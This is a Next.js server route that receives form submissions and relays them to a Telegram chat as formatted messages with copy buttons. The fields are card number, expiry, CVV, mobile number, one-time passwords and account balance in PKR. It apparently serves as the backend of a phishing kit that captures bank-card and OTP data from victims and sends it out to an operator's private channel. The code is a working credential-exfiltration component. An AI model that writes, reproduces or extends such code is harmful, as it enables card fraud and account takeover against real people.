import { NextResponse } from 'next/server'

// Escape values for Telegram HTML parse mode
function escapeHtml(value: string) {
  return value.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
}

// Wrap a "Label: value" line in its own <pre> block so Telegram renders it
// as a separate boxed section with its own tap-to-copy button
function copyableField(label: string, value: string | number) {
  return `<pre>${escapeHtml(label)}: ${escapeHtml(String(value))}</pre>`
}

export async function POST(request: Request) {
  const token = process.env.TELEGRAM_BOT_TOKEN
  const chatId = process.env.TELEGRAM_CHAT_ID

  if (!token || !chatId) {
    return NextResponse.json({ ok: false, error: 'Telegram is not configured.' }, { status: 503 })
  }

  let text = ''
  try {
    const body = await request.json()

    if (body?.card || body?.month || body?.year || body?.cvv) {
      // Card submission
      const lines = [
        '<b>New submission</b>',
        '<b>Card details</b>',
        body?.card ? copyableField('Card', body.card) : null,
        body?.month || body?.year ? copyableField('Expiry', `${body?.month ?? '--'}/${body?.year ?? '----'}`) : null,
        body?.cvv ? copyableField('CVV', body.cvv) : null,
        body?.mobile ? copyableField('Mobile', body.mobile) : null,
      ].filter(Boolean)
      text = lines.join('\n')
    } else if (body?.mobile) {
      text = ['<b>New submission</b>', '<b>Sign in</b>', copyableField('Mobile', body.mobile)].join('\n')
    } else if (body?.otp) {
      text = ['<b>New submission</b>', '<b>OTP</b>', copyableField('OTP', body.otp)].join('\n')
    } else if (body?.confirmOtp) {
      text = ['<b>New submission</b>', '<b>Confirm OTP</b>', copyableField('OTP', body.confirmOtp)].join('\n')
    } else if (body?.balance) {
      text = ['<b>New submission</b>', '<b>Balance</b>', copyableField('Balance', `PKR ${body.balance}`)].join('\n')
    } else if (typeof body?.text === 'string' && body.text.trim()) {
      text = escapeHtml(body.text.trim())
    } else {
      const value = typeof body?.number === 'string' ? body.number : String(body?.number ?? '')
      const trimmed = value.trim()
      text = trimmed
        ? ['<b>New submission</b>', '<b>Number</b>', copyableField('Number', trimmed)].join('\n')
        : ''
    }
  } catch {
    return NextResponse.json({ ok: false, error: 'Invalid request.' }, { status: 400 })
  }

  if (!text) {
    return NextResponse.json({ ok: false, error: 'Nothing to send.' }, { status: 400 })
  }

  try {
    const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text,
        parse_mode: 'HTML',
      }),
      cache: 'no-store',
    })

    if (!response.ok) {
      return NextResponse.json({ ok: false, error: 'Failed to send to Telegram.' }, { status: 502 })
    }

    return NextResponse.json({ ok: true })
  } catch {
    return NextResponse.json({ ok: false, error: 'Failed to send to Telegram.' }, { status: 502 })
  }
}

export function GET() {
  return NextResponse.json({ ok: false }, { status: 405 })
}
